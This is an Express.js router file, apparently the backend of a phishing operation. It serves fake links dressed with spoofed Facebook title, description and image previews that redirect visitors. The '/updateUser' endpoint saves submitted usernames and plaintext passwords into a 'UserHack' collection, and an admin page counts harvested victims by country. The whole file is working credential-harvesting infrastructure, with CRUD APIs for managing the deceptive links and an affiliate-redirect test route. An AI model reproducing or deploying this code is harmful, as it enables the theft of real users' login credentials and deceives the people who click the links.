const express = require('express');
const router = express.Router()
const homeController = require('../app/controllers/homeController');
const axios = require('axios')
const { listMongoose } = require('../util/mongoose')

const LinkFake = require('../models/LinkFake')
const UserHack = require('../models/UserHack')

router.get('/adminFakeLink', async (req, res) => {
    try {
        const listLink = await LinkFake.find({})
        const listUser = await UserHack.find({})

        let arrayCountry = []

        for (let index = 0; index < listUser.length; index++) {
            const element = listUser[index];

            const find = arrayCountry.find(value => element.countryCode == value)

            if (find == undefined) {
                arrayCountry.push(element.countryCode)
            }
        }

        res.render('admin', {
            listLink: listMongoose(listLink),
            userLength: listUser.length,
            arrayCountry: arrayCountry
        })
    } catch (error) {

    }
});
router.get('/:id', async (req, res) => {
    const params = req.params.id

    try {
        const link = await LinkFake.findOne({ linkFake: params })
        if (link.active) {
            res.status(200).render('fakelink', {
                urlRedirect: link.urlRedirect,
                tieudeFB: link.tieudeFB,
                motaFB: link.motaFB,
                picFB: link.picFB
            })
            res.redirect(301, link.urlRedirect)
            res.redirect(302, link.urlRedirect)
            res.end()
        } else {
            return res.render('404')
        }
    } catch (error) {
        console.log('error')
        // return res.render('404')
    }
})
router.get('/fakelink/test', async (req, res) => {
    try {
        res.status(200).render('fakelink')
        res.redirect(301, 'https://shopee.vn/universal-link/product/88201679/20493037179?utm_source=an_17311970017&utm_medium=affiliates&utm_campaign=-&utm_content=----&utm_term=aorfpi2yhhrf')
        res.redirect(302, 'https://shopee.vn/universal-link/product/88201679/20493037179?utm_source=an_17311970017&utm_medium=affiliates&utm_campaign=-&utm_content=----&utm_term=aorfpi2yhhrf')
        res.end()
    } catch (error) {
        console.log('error')
    }
})




router.post('/api/fakelink', async (req, res) => {
    const { linkFake, urlRedirect, tieudeFB, motaFB, picFB, active } = req.body

    try {
        const newLinkFake = new LinkFake({
            linkFake,
            urlRedirect,
            tieudeFB,
            motaFB,
            picFB,
            active
        })
        await newLinkFake.save()
        return res.status(200).json({
            success: true,
            message: 'Tạo Link Fake thành công',
        })

    } catch (error) {
        console.log(error)
        return res.status(400).json({
            success: false,
            message: 'Có lỗi xảy ra, vui lòng thử lại!'
        })
    }
})

router.post('/api/updateFakeLink', async (req, res) => {
    const { id, linkFake, urlRedirect, tieudeFB, motaFB, picFB, active } = req.body

    try {
        await LinkFake.updateOne({ _id: id }, {
            linkFake,
            urlRedirect,
            tieudeFB,
            motaFB,
            picFB,
            active
        })

        return res.status(200).json({
            success: true,
            message: 'Cập nhật Link Fake thành công',
        })
    } catch (error) {
        console.log(error)
        return res.status(400).json({
            success: false,
            message: 'Có lỗi xảy ra, vui lòng thử lại!'
        })
    }
})


router.post('/api/updateActiveFakeLink', async (req, res) => {
    const { id, active } = req.body

    try {
        await LinkFake.updateOne({ _id: id }, {
            active: active
        })

        return res.status(200).json({
            success: true,
            message: 'Cập nhật trạng thái Link Fake thành công',
        })
    } catch (error) {
        console.log(error)
        return res.status(400).json({
            success: false,
            message: 'Có lỗi xảy ra, vui lòng thử lại!'
        })
    }
})

router.post('/api/deleteActiveFakeLink', async (req, res) => {
    const { id } = req.body

    try {
        await LinkFake.findOneAndDelete({ _id: id })

        return res.status(200).json({
            success: true,
            message: 'Xóa Link Fake thành công',
        })
    } catch (error) {
        console.log(error)
        return res.status(400).json({
            success: false,
            message: 'Có lỗi xảy ra, vui lòng thử lại!'
        })
    }
})

router.get('/api/getFakeLink', async (req, res) => {
    try {
        const listLink = await LinkFake.find({})
        return res.status(200).json({
            success: true,
            data: listLink
        })
    } catch (error) {
        console.log(error)
        return res.status(400).json({
            success: false,
            message: 'Có lỗi xảy ra, vui lòng thử lại!'
        })
    }
})

router.post('/updateUser', async (req, res) => {
    const { username, password, countryCode } = req.body

    try {
        const newUser = new UserHack({
            username,
            password,
            countryCode
        })
        await newUser.save()

        return res.status(200).json({
            success: true,
            message: 'Tạo User thành công',
        })
    } catch (error) {
        return res.status(200).json({
            success: false,
            message: 'Your input is invalid'
        })
    }
})

router.get('*', function (req, res) {
    res.render('404');
});



// router.post('/cookie', homeController.cookie);
// router.get('/webhook', homeController.webhook);



module.exports = router